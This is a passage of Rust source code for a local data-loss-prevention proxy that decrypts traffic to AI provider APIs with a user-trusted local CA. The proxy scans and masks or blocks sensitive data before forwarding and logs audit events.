    #[serde(default = "default_action")]
    pub default_action: PolicyAction,
    #[serde(default)]
    pub metadata: HashMap<String, String>,
}

fn default_version() -> String {
    "1".to_string()
}

fn default_action() -> PolicyAction {
    PolicyAction::Allow
}

impl Default for PolicyConfig {
    fn default() -> Self {
        Self {
            version: default_version(),
            rules: Vec::new(),
            default_action: PolicyAction::Allow,
            metadata: HashMap::new(),
        }
    }
}

/// Context passed to the policy engine for evaluation.
pub struct PolicyContext<'a> {
    pub findings: &'a [eidra_scan::findings::Finding],
    pub destination: &'a str,
    pub data_size_bytes: u64,
    pub metadata: HashMap<String, String>,
}
```

### crates/eidra-proxy/src/ai_domains.rs
```rust
const AI_PROVIDER_DOMAINS: &[&str] = &[
    "api.openai.com",
    "api.anthropic.com",
    "generativelanguage.googleapis.com",
    "api.cohere.ai",
    "api.cohere.com",
    "api.mistral.ai",
    "api.groq.com",
    "api.together.xyz",
    "api.fireworks.ai",
    "api.perplexity.ai",
    "api.deepseek.com",
];

pub fn is_ai_provider(host: &str) -> bool {
    let host_lower = host.to_lowercase();
    // Strip port if present
    let hostname = host_lower.split(':').next().unwrap_or(&host_lower);
    AI_PROVIDER_DOMAINS.contains(&hostname)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ai_provider_match() {
        assert!(is_ai_provider("api.openai.com"));
        assert!(is_ai_provider("api.anthropic.com"));
        assert!(is_ai_provider("api.openai.com:443"));
    }

    #[test]
    fn test_non_ai_provider() {
        assert!(!is_ai_provider("example.com"));
        assert!(!is_ai_provider("google.com"));
    }
}
```

### crates/eidra-proxy/src/error.rs
```rust
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ProxyError {
    #[error("hyper error: {0}")]
    Hyper(#[from] hyper::Error),

    #[error("io error: {0}")]
    Io(#[from] std::io::Error),

    #[error("audit error: {0}")]
    Audit(#[from] eidra_audit::error::AuditError),

    #[error("invalid uri: {0}")]
    InvalidUri(String),

    #[error("connection failed: {0}")]
    ConnectionFailed(String),
}
```

### crates/eidra-proxy/src/handler.rs
```rust
use std::collections::HashMap;
use std::sync::Arc;

use http_body_util::{BodyExt, Full};
use hyper::body::{Bytes, Incoming};
use hyper::{Method, Request, Response, StatusCode};
use tokio::net::TcpStream;
use tokio_rustls::TlsAcceptor;

use eidra_audit::event::{ActionTaken, AuditEvent, EventType};
use eidra_audit::store::AuditStore;
use eidra_policy::engine::PolicyEngine;
use eidra_policy::types::{PolicyAction, PolicyContext};
use eidra_router::masking::mask_findings;
use eidra_scan::scanner::Scanner;

use crate::ai_domains::is_ai_provider;
use crate::tls::CaAuthority;
use crate::{EventSender, ProxyEvent};

fn send_event(event_tx: &EventSender, event: ProxyEvent) {
    if event_tx.send(event).is_err() {
        tracing::debug!(target: "eidra::proxy", "event channel: no active receivers");
    }
}

type BoxBody = http_body_util::combinators::BoxBody<Bytes, hyper::Error>;

fn full_body(data: impl Into<Bytes>) -> BoxBody {
    Full::new(data.into())
        .map_err(|never| match never {})
        .boxed()
}

fn empty_body() -> BoxBody {
    Full::new(Bytes::new())
        .map_err(|never| match never {})
        .boxed()
}

pub async fn handle_request(
    req: Request<Incoming>,
    scanner: Arc<Scanner>,
    policy: Arc<PolicyEngine>,
    audit: Arc<AuditStore>,
    event_tx: EventSender,
    ca: Option<Arc<CaAuthority>>,
) -> Result<Response<BoxBody>, hyper::Error> {
    if req.method() == Method::CONNECT {
        handle_connect(req, scanner, policy, audit, event_tx, ca).await
    } else {
        handle_http(req, scanner, policy, audit, event_tx).await
    }
}

async fn handle_connect(
    req: Request<Incoming>,
    scanner: Arc<Scanner>,
    policy: Arc<PolicyEngine>,
    audit: Arc<AuditStore>,
    event_tx: EventSender,
    ca: Option<Arc<CaAuthority>>,
) -> Result<Response<BoxBody>, hyper::Error> {
    let host = req
        .uri()
        .authority()
        .map(|a| a.to_string())
        .unwrap_or_default();

    let is_ai = is_ai_provider(&host);

    if is_ai {
        tracing::info!(target: "eidra::proxy", host = %host, "AI provider detected (CONNECT tunnel — MITM)");
    } else {
        tracing::debug!(target: "eidra::proxy", host = %host, "CONNECT tunnel (passthrough)");
    }

    // Only MITM AI providers, and only if we have a CA loaded
    let should_mitm = is_ai && ca.is_some();

    if should_mitm {
        let ca = ca.expect("checked is_some above");
        let host_clone = host.clone();

        tokio::spawn(async move {
            match hyper::upgrade::on(req).await {
                Ok(upgraded) => {
                    if let Err(e) =
                        mitm_tunnel(upgraded, &host_clone, ca, scanner, policy, audit, event_tx)
                            .await
                    {
                        tracing::error!(target: "eidra::proxy", error = %e, host = %host_clone, "MITM tunnel error");
                    }
                }
                Err(e) => {
                    tracing::error!(target: "eidra::proxy", error = %e, "upgrade error");
                }
            }
        });
    } else {
        tokio::spawn(async move {
            match hyper::upgrade::on(req).await {
                Ok(upgraded) => {
                    if let Err(e) = tunnel(upgraded, &host).await {
                        tracing::error!(target: "eidra::proxy", error = %e, "tunnel error");
                    }
                }
                Err(e) => {
                    tracing::error!(target: "eidra::proxy", error = %e, "upgrade error");
                }
            }
        });
    }

    Ok(Response::new(empty_body()))
}

/// Transparent byte-level tunnel for non-AI CONNECT requests.
async fn tunnel(
    upgraded: hyper::upgrade::Upgraded,
    host: &str,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut server = TcpStream::connect(host).await?;
    let mut upgraded = hyper_util::rt::TokioIo::new(upgraded);
    tokio::io::copy_bidirectional(&mut upgraded, &mut server).await?;
    Ok(())
}

/// MITM tunnel for AI provider CONNECT requests.
///
/// Uses hyper's native HTTP/1.1 framing instead of manual byte parsing.
/// This eliminates HTTP smuggling vulnerabilities and correctly handles
/// chunked encoding, content-length, and all HTTP framing edge cases.
///
/// 1. Accept TLS from client using a dynamically generated certificate
/// 2. Use hyper to serve the decrypted connection as an HTTP server
/// 3. For each request: scan, apply policy, forward upstream via hyper client
async fn mitm_tunnel(
    upgraded: hyper::upgrade::Upgraded,
    host: &str,
    ca: Arc<CaAuthority>,
    scanner: Arc<Scanner>,
    policy: Arc<PolicyEngine>,
    audit: Arc<AuditStore>,
    event_tx: EventSender,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let hostname = host.split(':').next().unwrap_or(host);
    let port = host
        .split(':')
        .nth(1)
        .and_then(|p| p.parse::<u16>().ok())
        .unwrap_or(443);

    // Generate TLS cert for this domain
    let server_config = ca.server_config_for_domain(hostname)?;
    let acceptor = TlsAcceptor::from(server_config);

    // Accept TLS from client
    let upgraded_io = hyper_util::rt::TokioIo::new(upgraded);
    let client_tls = acceptor
        .accept(upgraded_io)
        .await
        .map_err(|e| format!("TLS accept failed for {}: {}", hostname, e))?;

    tracing::debug!(target: "eidra::proxy", host = %hostname, "TLS accepted from client");

    // Wrap the TLS stream in TokioIo for hyper
    let client_io = hyper_util::rt::TokioIo::new(client_tls);

    // Use hyper to serve the connection — this handles HTTP framing natively
    let hostname_owned = hostname.to_string();
    let port_owned = port;

    let service = hyper::service::service_fn(move |req: Request<Incoming>| {
        let scanner = scanner.clone();
        let policy = policy.clone();
        let audit = audit.clone();
        let event_tx = event_tx.clone();
        let hostname = hostname_owned.clone();

        async move {
            handle_mitm_request(req, &hostname, port_owned, scanner, policy, audit, event_tx).await
        }
    });

    // Serve one HTTP/1.1 connection (may handle multiple requests via keep-alive)
    if let Err(e) = hyper::server::conn::http1::Builder::new()
        .preserve_header_case(true)
        .title_case_headers(true)
        .serve_connection(client_io, service)
        .await
    {
        tracing::debug!(target: "eidra::proxy", error = %e, "MITM connection ended");
    }

    Ok(())
}

/// Handle a single request in MITM mode — scan, apply policy, forward upstream via HTTPS.
async fn handle_mitm_request(
    req: Request<Incoming>,
    hostname: &str,
    port: u16,
    scanner: Arc<Scanner>,
    policy: Arc<PolicyEngine>,
    audit: Arc<AuditStore>,
    event_tx: EventSender,
) -> Result<Response<BoxBody>, hyper::Error> {
    // Collect the full body (hyper handles chunked/content-length natively)
    let (parts, body) = req.into_parts();
    let body_bytes = body.collect().await?.to_bytes();
    let body_size = body_bytes.len() as u64;
    let body_str = String::from_utf8_lossy(&body_bytes).to_string();

    tracing::info!(
        target: "eidra::proxy",
        host = %hostname,
        body_size = body_size,
        "MITM: intercepted HTTPS request"
    );

    // Scan the request body
    let findings = scanner.scan(&body_str);

    // Log findings
    for finding in &findings {
        tracing::warn!(
            target: "eidra::proxy",
            rule = %finding.rule_name,
            category = %finding.category,
            severity = %finding.severity,
            "MITM Finding detected"
        );
    }

    // If no findings, forward as-is
    if findings.is_empty() {
        tracing::info!(target: "eidra::proxy", host = %hostname, "MITM: clean request");
        send_event(
            &event_tx,
            ProxyEvent {
                timestamp: chrono::Utc::now(),
                action: "allow".to_string(),
                provider: hostname.to_string(),
                findings_count: 0,
                categories: vec![],
                data_size_bytes: body_size,
            },
        );
        let event = AuditEvent::new(
            EventType::AiRequest,
            ActionTaken::Allow,
            hostname,
            0,
            "[]",
            body_size,
        );
        let _ = audit.log_event(&event);

        return forward_upstream_tls(parts, body_bytes, hostname, port).await;
    }

    // Apply policy
    let ctx = PolicyContext {
        findings: &findings,
        destination: hostname,
        data_size_bytes: body_size,
        metadata: HashMap::new(),
    };
    let decision = policy.evaluate(&ctx);
    let categories: Vec<String> = findings.iter().map(|f| f.category.to_string()).collect();

    match decision.overall_action {
        PolicyAction::Block => {
            tracing::warn!(target: "eidra::proxy", host = %hostname, "MITM: BLOCKED");
            send_event(
                &event_tx,
                ProxyEvent {
                    timestamp: chrono::Utc::now(),
                    action: "block".to_string(),
                    provider: hostname.to_string(),
                    findings_count: findings.len() as u32,
                    categories: categories.clone(),
                    data_size_bytes: body_size,
                },
            );
            let summary = serde_json::to_string(&categories).unwrap_or_default();
            let event = AuditEvent::new(
                EventType::AiRequest,
                ActionTaken::Block,
                hostname,
                findings.len() as u32,
                summary,
                body_size,
            );
            let _ = audit.log_event(&event);

            let block_body = serde_json::json!({
                "error": "blocked_by_eidra",
                "message": "Request blocked: contains sensitive data that violates security policy",
                "findings_count": findings.len(),
                "categories": categories,
            });
            let mut resp = Response::new(full_body(block_body.to_string()));
            *resp.status_mut() = StatusCode::FORBIDDEN;
            Ok(resp)
        }
        PolicyAction::Mask => {
            tracing::info!(target: "eidra::proxy", host = %hostname, findings = findings.len(), "MITM: masking");
            let masked = mask_findings(&body_str, &findings);
            let masked_bytes = Bytes::from(masked);

            send_event(
                &event_tx,
                ProxyEvent {
                    timestamp: chrono::Utc::now(),
                    action: "mask".to_string(),
                    provider: hostname.to_string(),
                    findings_count: findings.len() as u32,
                    categories: categories.clone(),
                    data_size_bytes: body_size,
                },
            );
            let summary = serde_json::to_string(&categories).unwrap_or_default();
            let event = AuditEvent::new(
                EventType::AiRequest,
                ActionTaken::Mask,
                hostname,
                findings.len() as u32,
                summary,
                body_size,
            );
            let _ = audit.log_event(&event);

            forward_upstream_tls(parts, masked_bytes, hostname, port).await
        }
        _ => {
            tracing::info!(target: "eidra::proxy", host = %hostname, "MITM: allowing with findings");
            send_event(
                &event_tx,
                ProxyEvent {
                    timestamp: chrono::Utc::now(),
                    action: "allow".to_string(),
                    provider: hostname.to_string(),
                    findings_count: findings.len() as u32,
                    categories: categories.clone(),
                    data_size_bytes: body_size,
                },
            );
            let summary = serde_json::to_string(&categories).unwrap_or_default();
            let event = AuditEvent::new(
                EventType::AiRequest,
                ActionTaken::Allow,
                hostname,
                findings.len() as u32,
                summary,
                body_size,
            );
            let _ = audit.log_event(&event);

            forward_upstream_tls(parts, body_bytes, hostname, port).await
        }
    }
}

/// Forward a request to the real upstream server via HTTPS (TLS client).
///
/// Uses hyper-rustls for proper HTTP/1.1 framing over TLS, replacing
/// the previous manual byte-level forwarding.
async fn forward_upstream_tls(
    parts: hyper::http::request::Parts,
    body: Bytes,
    hostname: &str,
    port: u16,
) -> Result<Response<BoxBody>, hyper::Error> {
    // Build upstream URI
    let path = parts
        .uri
        .path_and_query()
        .map(|pq| pq.as_str())
        .unwrap_or("/");
    let upstream_uri: hyper::Uri = format!("https://{}:{}{}", hostname, port, path)
        .parse()
        .unwrap_or_else(|_| format!("https://{}{}", hostname, path).parse().unwrap());

    // Create TLS connector
    let client_config = match crate::tls::make_upstream_client_config() {
        Ok(cfg) => cfg,
        Err(e) => {
            tracing::error!(target: "eidra::proxy", error = %e, "failed to create TLS client config");
            let mut resp = Response::new(full_body(format!("TLS error: {}", e)));
            *resp.status_mut() = StatusCode::BAD_GATEWAY;
            return Ok(resp);
        }
    };

    let https_connector = hyper_rustls::HttpsConnectorBuilder::new()
        .with_tls_config(client_config)
        .https_only()
        .enable_http1()
        .build();

    let client = hyper_util::client::legacy::Client::builder(hyper_util::rt::TokioExecutor::new())
        .build(https_connector);

    // Build the upstream request, preserving original headers
    let mut upstream_req = Request::from_parts(parts, Full::new(body));
    *upstream_req.uri_mut() = upstream_uri;

    match client.request(upstream_req).await {
        Ok(resp) => {
            let (parts, body) = resp.into_parts();
            let body_bytes = body.collect().await?.to_bytes();
            Ok(Response::from_parts(parts, full_body(body_bytes)))
        }
        Err(e) => {
            tracing::error!(target: "eidra::proxy", error = %e, "upstream TLS request failed");
            let mut resp = Response::new(full_body(format!("Upstream error: {}", e)));
            *resp.status_mut() = StatusCode::BAD_GATEWAY;
            Ok(resp)
        }
    }
}

async fn handle_http(
    req: Request<Incoming>,
    scanner: Arc<Scanner>,
    policy: Arc<PolicyEngine>,
    audit: Arc<AuditStore>,
    event_tx: EventSender,
) -> Result<Response<BoxBody>, hyper::Error> {
    let uri = req.uri().clone();
    let host = uri.host().unwrap_or("unknown").to_string();
    let is_ai = is_ai_provider(&host);

    if is_ai {
        tracing::info!(target: "eidra::proxy", host = %host, uri = %uri, "AI request intercepted");
    }

    // Collect body
    let (parts, body) = req.into_parts();
    let body_bytes = body.collect().await?.to_bytes();
    let body_size = body_bytes.len() as u64;

    // If not AI provider, passthrough immediately
    if !is_ai {
        let mut upstream_req = Request::from_parts(parts, Full::new(body_bytes));
        if let Ok(parsed) = uri.to_string().parse() {
            *upstream_req.uri_mut() = parsed;
        }
        return forward_request(upstream_req).await;
    }

    // Scan
    let body_str = String::from_utf8_lossy(&body_bytes).to_string();
    let findings = scanner.scan(&body_str);

    if findings.is_empty() {
        tracing::info!(target: "eidra::proxy", host = %host, "No findings — clean request");
        let audit_event = AuditEvent::new(
            EventType::AiRequest,
            ActionTaken::Allow,
            &host,
            0,
            "[]",
            body_size,
        );
        let _ = audit.log_event(&audit_event);
        send_event(
            &event_tx,
            ProxyEvent {
                timestamp: chrono::Utc::now(),
                action: "allow".to_string(),
                provider: host.clone(),
                findings_count: 0,
                categories: vec![],
                data_size_bytes: body_size,
            },
        );

        let mut upstream_req = Request::from_parts(parts, Full::new(body_bytes));
        if let Ok(parsed) = uri.to_string().parse() {
            *upstream_req.uri_mut() = parsed;
        }
        return forward_request(upstream_req).await;
    }

    // Log findings
    for finding in &findings {
        tracing::warn!(
            target: "eidra::proxy",
            rule = %finding.rule_name,
            category = %finding.category,
            severity = %finding.severity,
            "Finding detected"
        );
    }

    // Policy evaluation
    let ctx = PolicyContext {
        findings: &findings,
        destination: &host,
        data_size_bytes: body_size,
        metadata: HashMap::new(),
    };
    let decision = policy.evaluate(&ctx);

    let (final_body, audit_action) = match decision.overall_action {
        PolicyAction::Block => {
            tracing::warn!(target: "eidra::proxy", host = %host, "Request BLOCKED by policy");
            let categories: Vec<String> = findings.iter().map(|f| f.category.to_string()).collect();
            let summary = serde_json::to_string(&categories).unwrap_or_default();
            let event = AuditEvent::new(
                EventType::AiRequest,
                ActionTaken::Block,
                &host,
                findings.len() as u32,
                summary,
                body_size,
            );
            let _ = audit.log_event(&event);
            send_event(
                &event_tx,
                ProxyEvent {
                    timestamp: chrono::Utc::now(),
                    action: "block".to_string(),
                    provider: host.clone(),
                    findings_count: findings.len() as u32,
                    categories: categories.clone(),
                    data_size_bytes: body_size,
                },
            );

            let block_body = serde_json::json!({
                "error": "blocked_by_eidra",
                "message": "Request blocked: contains sensitive data that violates security policy",
                "findings_count": findings.len(),
                "categories": findings.iter().map(|f| f.category.to_string()).collect::<Vec<_>>(),
            });
            let mut resp = Response::new(full_body(block_body.to_string()));
            *resp.status_mut() = StatusCode::FORBIDDEN;
            return Ok(resp);
        }
        PolicyAction::Mask => {
            tracing::info!(target: "eidra::proxy", host = %host, findings = findings.len(), "Masking findings");
            let masked = mask_findings(&body_str, &findings);
            (Bytes::from(masked), ActionTaken::Mask)
        }
        _ => {
            tracing::info!(target: "eidra::proxy", host = %host, "Allowing with findings");
            (body_bytes, ActionTaken::Allow)
        }
    };

    // Log audit event
    let categories: Vec<String> = findings.iter().map(|f| f.category.to_string()).collect();
    let summary = serde_json::to_string(&categories).unwrap_or_default();
    let event = AuditEvent::new(
        EventType::AiRequest,
        audit_action,
        &host,
        findings.len() as u32,
        summary,
        body_size,
    );
    let _ = audit.log_event(&event);
    let action_str = match &event.action {
        ActionTaken::Mask => "mask",
        ActionTaken::Block => "block",
        ActionTaken::Allow => "allow",
        _ => "allow",
    };
    send_event(
        &event_tx,
        ProxyEvent {
            timestamp: chrono::Utc::now(),
            action: action_str.to_string(),
            provider: host.clone(),
            findings_count: findings.len() as u32,
            categories,
            data_size_bytes: body_size,
        },
    );

    // Forward (possibly masked) request
    let mut upstream_req = Request::from_parts(parts, Full::new(final_body));
    if let Ok(parsed) = uri.to_string().parse() {
        *upstream_req.uri_mut() = parsed;
    }
    forward_request(upstream_req).await
}

async fn forward_request(req: Request<Full<Bytes>>) -> Result<Response<BoxBody>, hyper::Error> {
    let connector = hyper_util::client::legacy::connect::HttpConnector::new();
    let client = hyper_util::client::legacy::Client::builder(hyper_util::rt::TokioExecutor::new())
        .build(connector);

    let resp: Result<Response<Incoming>, _> = client.request(req).await;
    match resp {
        Ok(resp) => {
            let (parts, body) = resp.into_parts();
            let body_bytes: Bytes = body.collect().await?.to_bytes();
            Ok(Response::from_parts(parts, full_body(body_bytes)))
        }
        Err(e) => {
            tracing::error!(target: "eidra::proxy", error = %e, "upstream request failed");
            let mut resp = Response::new(full_body(format!("Upstream error: {}", e)));
            *resp.status_mut() = StatusCode::BAD_GATEWAY;
            Ok(resp)
        }
    }
}
```

### crates/eidra-proxy/src/lib.rs
```rust
pub mod ai_domains;
pub mod error;
pub mod handler;
pub mod server;
pub mod tls;

/// Channel for sending request events to the TUI dashboard.
pub type EventSender = tokio::sync::broadcast::Sender<ProxyEvent>;
pub type EventReceiver = tokio::sync::broadcast::Receiver<ProxyEvent>;

#[derive(Debug, Clone)]
pub struct ProxyEvent {
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub action: String,
    pub provider: String,
    pub findings_count: u32,
    pub categories: Vec<String>,
    pub data_size_bytes: u64,
}

pub fn create_event_channel() -> (EventSender, EventReceiver) {
    tokio::sync::broadcast::channel(256)
}
```

### crates/eidra-proxy/src/server.rs
```rust
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;

use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper_util::rt::TokioIo;
use tokio::net::TcpListener;

use eidra_audit::store::AuditStore;
use eidra_policy::engine::PolicyEngine;
use eidra_scan::scanner::Scanner;

use crate::error::ProxyError;
use crate::handler::handle_request;
use crate::tls::CaAuthority;
use crate::EventSender;

pub struct ProxyConfig {
    pub listen_addr: SocketAddr,
    pub metadata: HashMap<String, String>,
}

impl Default for ProxyConfig {
    fn default() -> Self {
        Self {
            listen_addr: ([127, 0, 0, 1], 8080).into(),
            metadata: HashMap::new(),
        }
    }
}

pub async fn run_proxy(
    config: ProxyConfig,
    scanner: Arc<Scanner>,
    policy: Arc<PolicyEngine>,
    audit: Arc<AuditStore>,
    event_tx: EventSender,
    ca: Option<Arc<CaAuthority>>,
) -> Result<(), ProxyError> {
    let listener = TcpListener::bind(config.listen_addr).await?;

    if ca.is_some() {
        tracing::info!(
            target: "eidra::proxy",
            addr = %config.listen_addr,
            "Proxy listening (HTTPS MITM enabled for AI providers)"
        );
    } else {
        tracing::info!(
            target: "eidra::proxy",
            addr = %config.listen_addr,
            "Proxy listening (HTTP-only mode — no CA loaded)"
        );
    }

    loop {
        let (stream, addr) = listener.accept().await?;
        let scanner = scanner.clone();
        let policy = policy.clone();
        let audit = audit.clone();
        let event_tx = event_tx.clone();
        let ca = ca.clone();

        tokio::spawn(async move {
            let io = TokioIo::new(stream);
            let scanner = scanner.clone();
            let policy = policy.clone();
            let audit = audit.clone();
            let event_tx = event_tx.clone();
            let ca = ca.clone();

            let service = service_fn(move |req| {
                let scanner = scanner.clone();
                let policy = policy.clone();
                let audit = audit.clone();
                let event_tx = event_tx.clone();
                let ca = ca.clone();
                async move { handle_request(req, scanner, policy, audit, event_tx, ca).await }
            });

            if let Err(e) = http1::Builder::new()
                .preserve_header_case(true)
                .title_case_headers(true)
                .serve_connection(io, service)
                .with_upgrades()
                .await
            {
                tracing::debug!(
                    target: "eidra::proxy",
                    addr = %addr,
                    error = %e,
                    "connection error"
                );
            }
        });
    }
}
```

### crates/eidra-proxy/src/tls.rs
```rust
use std::collections::HashMap;
use std::sync::{Arc, RwLock};

use rcgen::{
    BasicConstraints, CertificateParams, DistinguishedName, DnType, IsCa, KeyPair, SanType,
};
use tokio_rustls::rustls::{self, ServerConfig};

/// Certificate Authority used to sign dynamically generated per-domain certificates.
pub struct CaAuthority {
    /// The signing certificate (rebuilt from key for rcgen's signing API).
    signing_cert: rcgen::Certificate,
    ca_key: KeyPair,
    /// The original CA cert DER bytes — this is what the user trusted in their OS.
    /// Used in the TLS chain so clients validate against the trusted cert.
    original_cert_der: Vec<u8>,
    /// Cache of generated server configs keyed by domain name.
    cache: RwLock<HashMap<String, Arc<ServerConfig>>>,
}

impl CaAuthority {
    /// Load the CA certificate and private key from PEM files on disk.
    pub fn load(
        ca_cert_path: &std::path::Path,
        ca_key_path: &std::path::Path,
    ) -> Result<Self, TlsError> {
        let cert_pem = std::fs::read_to_string(ca_cert_path)
            .map_err(|e| TlsError::Io(format!("reading CA cert: {}", e)))?;
        let key_pem = std::fs::read_to_string(ca_key_path)
            .map_err(|e| TlsError::Io(format!("reading CA key: {}", e)))?;

        let ca_key = KeyPair::from_pem(&key_pem)
            .map_err(|e| TlsError::CertGeneration(format!("parsing CA key: {}", e)))?;

        // Parse the original CA cert PEM to extract DER bytes.
        // This preserves the exact cert the user trusted in their OS.
        let original_cert_der = pem_to_der(&cert_pem)?;

        // Rebuild a CA certificate from the key for rcgen's signing API.
        // rcgen 0.13 doesn't expose from_ca_cert_pem, so we reconstruct.
        // The signing cert is only used internally by rcgen — the TLS chain
        // uses original_cert_der to match what the OS trusts.
        let mut ca_params = CertificateParams::default();
        ca_params.is_ca = IsCa::Ca(BasicConstraints::Unconstrained);
        ca_params.distinguished_name = {
            let mut dn = DistinguishedName::new();
            dn.push(DnType::CommonName, "Eidra Local CA");
            dn.push(DnType::OrganizationName, "Eidra");
            dn
        };

        let signing_cert = ca_params
            .self_signed(&ca_key)
            .map_err(|e| TlsError::CertGeneration(format!("rebuilding CA cert: {}", e)))?;

        Ok(Self {
            signing_cert,
            ca_key,
            original_cert_der,
            cache: RwLock::new(HashMap::new()),
        })
    }

    /// Get or generate a `rustls::ServerConfig` for the given domain.
    ///
    /// Certificates are cached so that repeated requests for the same domain
    /// do not trigger unnecessary key generation.
    pub fn server_config_for_domain(&self, domain: &str) -> Result<Arc<ServerConfig>, TlsError> {
        // Check cache first (read lock)
        {
            let cache = self.cache.read().map_err(|_| TlsError::LockPoisoned)?;
            if let Some(cfg) = cache.get(domain) {
                return Ok(Arc::clone(cfg));
            }
        }

        // Generate a new certificate signed by the CA
        let server_config = self.generate_server_config(domain)?;
        let server_config = Arc::new(server_config);

        // Insert into cache (write lock)
        {
            let mut cache = self.cache.write().map_err(|_| TlsError::LockPoisoned)?;
            cache.insert(domain.to_string(), Arc::clone(&server_config));
        }

        Ok(server_config)
    }

    fn generate_server_config(&self, domain: &str) -> Result<ServerConfig, TlsError> {
        let mut params = CertificateParams::default();
        params.distinguished_name = {
            let mut dn = DistinguishedName::new();
            dn.push(DnType::CommonName, domain);
            dn.push(DnType::OrganizationName, "Eidra MITM Proxy");
            dn
        };
        params.subject_alt_names =
            vec![SanType::DnsName(domain.try_into().map_err(|e| {
                TlsError::CertGeneration(format!("invalid SAN: {}", e))
            })?)];

        let server_key = KeyPair::generate()
            .map_err(|e| TlsError::CertGeneration(format!("generating server key: {}", e)))?;

        let server_cert = params
            .signed_by(&server_key, &self.signing_cert, &self.ca_key)
            .map_err(|e| TlsError::CertGeneration(format!("signing server cert: {}", e)))?;

        let cert_der = rustls::pki_types::CertificateDer::from(server_cert.der().to_vec());
        // Use the ORIGINAL CA cert DER (what the OS trusts), not the rebuilt one
        let ca_der = rustls::pki_types::CertificateDer::from(self.original_cert_der.clone());
        let key_der = rustls::pki_types::PrivateKeyDer::try_from(server_key.serialize_der())
            .map_err(|e| TlsError::CertGeneration(format!("serializing server key: {}", e)))?;

        let config = ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(vec![cert_der, ca_der], key_der)
            .map_err(|e| TlsError::Rustls(format!("building server config: {}", e)))?;

        Ok(config)
    }
}

/// Parse PEM-encoded certificate and extract DER bytes.
fn pem_to_der(pem_str: &str) -> Result<Vec<u8>, TlsError> {
    // Simple PEM parser: extract base64 between BEGIN/END markers
    let mut in_cert = false;
    let mut b64 = String::new();
    for line in pem_str.lines() {
        if line.contains("BEGIN CERTIFICATE") {
            in_cert = true;
            continue;
        }
        if line.contains("END CERTIFICATE") {
            break;
        }
        if in_cert {
            b64.push_str(line.trim());
        }
    }

    if b64.is_empty() {
        return Err(TlsError::CertGeneration(
            "no CERTIFICATE block found in PEM".to_string(),
        ));
    }

    // Decode base64
    base64_decode(&b64)
        .map_err(|e| TlsError::CertGeneration(format!("invalid base64 in PEM: {}", e)))
}

/// Simple base64 decoder (no external dependency needed).
fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let input: Vec<u8> = input.bytes().filter(|b| !b.is_ascii_whitespace()).collect();
    let mut output = Vec::with_capacity(input.len() * 3 / 4);

    for chunk in input.chunks(4) {
        let mut buf = [0u8; 4];
        let mut pad = 0;
        for (i, &byte) in chunk.iter().enumerate() {
            if byte == b'=' {
                pad += 1;
                buf[i] = 0;
            } else if let Some(pos) = TABLE.iter().position(|&b| b == byte) {
                buf[i] = pos as u8;
            } else {
                return Err(format!("invalid base64 char: {}", byte as char));
            }
        }
        if chunk.len() >= 2 {
            output.push((buf[0] << 2) | (buf[1] >> 4));
        }
        if chunk.len() >= 3 && pad < 2 {
            output.push((buf[1] << 4) | (buf[2] >> 2));
        }
        if chunk.len() >= 4 && pad < 1 {
            output.push((buf[2] << 6) | buf[3]);
        }
    }
    Ok(output)
}

/// Create a `rustls::ClientConfig` that trusts platform root certificates.
pub fn make_upstream_client_config() -> Result<rustls::ClientConfig, TlsError> {
    let mut root_store = rustls::RootCertStore::empty();

    let native_certs = rustls_native_certs::load_native_certs();
    if native_certs.certs.is_empty() {
        return Err(TlsError::Rustls(
            "no native root certificates found — cannot verify upstream TLS".to_string(),
        ));
    }
    for cert in native_certs.certs {
        root_store
            .add(cert)
            .map_err(|e| TlsError::Rustls(format!("adding root cert: {}", e)))?;
    }

    let config = rustls::ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(config)
}

#[derive(Debug, thiserror::Error)]
pub enum TlsError {
    #[error("I/O error: {0}")]
    Io(String),

    #[error("certificate generation error: {0}")]
    CertGeneration(String),

    #[error("rustls error: {0}")]
    Rustls(String),

    #[error("internal lock poisoned")]
    LockPoisoned,
}
```

### crates/eidra-router/src/error.rs
```rust
use thiserror::Error;

/// Errors that can occur in the router.
#[derive(Debug, Error)]
pub enum RouterError {
    /// The local Ollama instance is not available.
    #[error("Ollama is unavailable at endpoint '{endpoint}'")]
    OllamaUnavailable { endpoint: String },

    /// Error converting between API formats.
    #[error("Format conversion error: {0}")]
    FormatConversion(String),

    /// Error from the upstream LLM provider.
    #[error("Upstream error: {0}")]
    UpstreamError(String),

    /// HTTP/network transport error.
    #[error("Transport error: {0}")]
    Transport(#[from] hyper::Error),

    /// JSON serialization/deserialization error.
    #[error("Serialization error: {0}")]
    Serialization(#[from] serde_json::Error),

    /// Generic I/O error.
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),

    /// Custom error for extensibility.
    #[error("Router error: {0}")]
    Custom(String),
}
```

### crates/eidra-router/src/lib.rs
```rust
pub mod error;
pub mod masking;
pub mod ollama;
```

### crates/eidra-router/src/masking.rs
```rust
use eidra_scan::findings::Finding;
use sha2::{Digest, Sha256};

/// Apply masking to the input string based on findings.
/// Replaces matched text with `[REDACTED:{category}:{hash6}]`.
/// Builds a new string by copying segments between findings, avoiding
/// panics from UTF-8 boundary misalignment or overlapping ranges.
pub fn mask_findings(input: &str, findings: &[Finding]) -> String {
    if findings.is_empty() {
        return input.to_string();
    }

    // Sort findings by offset, deduplicate overlapping ranges
    let mut sorted: Vec<&Finding> = findings.iter().collect();
    sorted.sort_by_key(|f| f.offset);

    // Build result by copying segments between findings
    let input_bytes = input.as_bytes();
    let mut result = String::new();
    let mut pos = 0;

    for finding in &sorted {
        let start = finding.offset;
        let end = (finding.offset + finding.length).min(input_bytes.len());

        // Skip if this finding overlaps with a previous one we already processed
        if start < pos {
            continue;
        }

        // Validate byte boundaries are valid UTF-8 boundaries
        if !input.is_char_boundary(start) || !input.is_char_boundary(end) {
            // Skip this finding rather than panic
            tracing::warn!(
                rule = %finding.rule_name,
                offset = start,
